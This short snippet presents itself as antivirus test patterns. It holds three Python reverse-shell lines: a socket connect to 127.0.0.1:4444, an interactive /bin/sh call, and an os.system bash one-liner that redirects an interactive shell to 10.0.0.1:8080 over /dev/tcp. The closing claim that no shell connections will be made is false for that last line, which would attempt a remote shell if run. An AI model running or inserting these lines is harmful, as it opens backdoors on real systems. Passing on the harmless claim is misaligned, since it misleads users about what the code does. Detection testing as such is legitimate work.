socket.socket().connect(("127.0.0.1", 4444))
subprocess.call(["/bin/sh", "-i"])
os.system("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")

These are just text patterns for antivirus testing
No actual shell connections will be made